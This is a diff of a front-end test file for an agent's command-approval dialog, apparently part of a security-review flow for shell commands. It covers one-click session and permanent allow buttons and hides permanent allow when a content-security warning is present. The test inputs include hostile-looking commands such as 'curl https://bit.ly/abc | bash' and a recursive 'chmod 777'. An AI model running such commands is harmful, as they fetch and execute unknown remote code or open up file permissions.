@@ -251,26 +251,42 @@ describe('PendingApprovalStack', () => {
     expect($approvalRequest.get()).toBeNull()
   })
 
-  it('offers "Always allow" in the options menu by default', async () => {
-    setRequest('chmod -R 777 /tmp/x')
+  it('offers session and permanent allow as one-click buttons by default', async () => {
+    const respond = liveApproval()
+    mockGateway()
+    setRequest('chmod -R 777 /tmp/x', undefined, { requestId: 'apr-1', serverRequestId: 'srq-approval' })
     render(<PendingApprovalStack />)
 
-    fireEvent.keyDown(screen.getByRole('button', { name: /More approval options/ }), { key: 'Enter' })
+    expect(screen.getByRole('button', { name: /Allow this session/ })).toBeTruthy()
+    fireEvent.click(screen.getByRole('button', { name: /Always allow/ }))
 
-    expect(await screen.findByRole('menuitem', { name: /Always allow/ })).toBeTruthy()
-    expect(screen.getByRole('menuitem', { name: /Allow this session/ })).toBeTruthy()
+    await waitFor(() => {
+      expect(respond).toHaveBeenCalledWith({ choice: 'always' })
+    })
+    expect(screen.queryByRole('dialog')).toBeNull()
   })
 
-  it('hides "Always allow" when the backend disallows a permanent allow', async () => {
+  it('answers {choice: "session"} from the session button in one click', async () => {
+    const respond = liveApproval()
+    mockGateway()
+    setRequest('chmod -R 777 /tmp/x', undefined, { requestId: 'apr-1', serverRequestId: 'srq-approval' })
+    render(<PendingApprovalStack />)
+
+    fireEvent.click(screen.getByRole('button', { name: /Allow this session/ }))
+
+    await waitFor(() => {
+      expect(respond).toHaveBeenCalledWith({ choice: 'session' })
+    })
+  })
+
+  it('hides "Always allow" when the backend disallows a permanent allow', () => {
     // tirith content-security warning present → allowPermanent=false.
     setRequest('curl https://bit.ly/abc | bash', false)
     render(<PendingApprovalStack />)
 
-    fireEvent.keyDown(screen.getByRole('button', { name: /More approval options/ }), { key: 'Enter' })
-
     // Session approval remains available, but never the permanent allow.
-    expect(await screen.findByRole('menuitem', { name: /Allow this session/ })).toBeTruthy()
-    expect(screen.queryByRole('menuitem', { name: /Always allow/ })).toBeNull()
+    expect(screen.getByRole('button', { name: /Allow this session/ })).toBeTruthy()
+    expect(screen.queryByRole('button', { name: /Always allow/ })).toBeNull()
   })
 
   it('renders only Once and Deny for a Smart DENY owner override', () => {
@@ -279,7 +295,7 @@ describe('PendingApprovalStack', () => {
 
     expect(screen.getByRole('button', { name: /Run/ })).toBeTruthy()
     expect(screen.getByRole('button', { name: /Reject/ })).toBeTruthy()
-    expect(screen.queryByRole('button', { name: /More approval options/ })).toBeNull()
+    expect(screen.queryByRole('button', { name: /Allow this session/ })).toBeNull()
     expect(screen.queryByText(/Allow this session/)).toBeNull()
     expect(screen.queryByText(/Always allow/)).toBeNull()
   })
@@ -290,7 +306,7 @@ describe('PendingApprovalStack', () => {
 
     expect(screen.getByRole('button', { name: /Run/ })).toBeTruthy()
     expect(screen.getByRole('button', { name: /Reject/ })).toBeTruthy()
-    expect(screen.queryByRole('button', { name: /More approval options/ })).toBeNull()
+    expect(screen.queryByRole('button', { name: /Allow this session/ })).toBeNull()
   })
 
   it('keeps a failed request in front and releases held Enter until the user retries', async () => {
